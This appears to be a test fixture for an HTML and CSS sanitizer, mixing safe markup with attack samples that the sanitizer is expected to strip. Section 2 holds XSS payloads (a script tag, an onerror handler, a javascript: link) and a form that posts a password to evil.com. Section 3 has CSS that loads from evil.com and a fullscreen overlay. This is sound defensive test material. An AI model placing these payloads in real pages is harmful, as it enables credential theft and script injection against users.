# Golden Fixture: HTML & CSS Sanitization and Scope Isolation

This fixture validates AST-based HTML sanitization, CSS scoping, and attack neutralization per PRD Section 7.3, 7.4, 8.1, 8.2 and ADR-0003.

---

## 1. Safe Semantic HTML and Bidirectional Text (AC 1)

<div dir="rtl" class="highlight" title="Persian block">
  <span style="color: red; font-weight: bold;">متن فارسی با جهت راست به چپ و رنگ قرمز</span>
</div>

<div dir="ltr" class="ltr-container">
  <p>English text in an LTR block with <em>italics</em> and <strong>bold</strong> formatting.</p>
</div>

### Safe Table and Details

<table class="styled-table">
  <thead>
    <tr><th>Feature</th><th>Status</th></tr>
  </thead>
  <tbody>
    <tr><td>HTML Sanitization</td><td>Active</td></tr>
    <tr><td>CSS Scoping</td><td>Enforced</td></tr>
  </tbody>
</table>

<details open>
  <summary>Sanitization Rules</summary>
  <p>Only allowlisted semantic tags pass into the React virtual DOM.</p>
</details>

<figure>
  <figcaption>Figure caption inside semantic figure tag.</figcaption>
</figure>

---

## 2. Injected Script and Active Executables (AC 2, AC 3)

The following attack payloads must be completely stripped or neutralized:

<script>
  window.__malicious_executed = true;
  alert("XSS payload");
</script>

<img src="./assets/safe.png" onerror="window.__img_onerror_fired = true; alert('onerror')" alt="Safe Image">

<a href="javascript:alert('malicious link')" class="bad-link">Dangerous Javascript Link</a>
<a href="https://example.com" class="good-link">Safe External Link</a>

<iframe src="https://evil.com/phishing.html">Hidden malicious frame</iframe>
<form action="https://evil.com/steal" method="POST">
  <input type="text" name="password" value="secret">
  <button type="submit">Submit Creds</button>
</form>

---

## 3. Scoped Author Styles and Viewport Overlay Neutralization (AC 4, AC 5, AC 6)

<style>
  @import url("http://evil.com/external-leak.css");

  .sidebar {
    color: blue;
    font-size: 16px;
  }

  .fullscreen-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 999999;
    background-image: url("http://evil.com/telemetry.png");
  }

  .tab-bar {
    display: none;
  }

  body {
    background-color: yellow;
  }
</style>

<div class="sidebar">Author-styled sidebar text in blue</div>
<div class="fullscreen-overlay">Overlay box converted to absolute</div>

---

## 4. Malformed HTML & CSS Graceful Partial Rendering (AC 7)

<style>
  .broken { syntax-error !@@#$$ unclosed
</style>

<div><p>Unclosed HTML tag inside paragraph.

<p>Document rendering must continue smoothly despite malformed markup.</p>
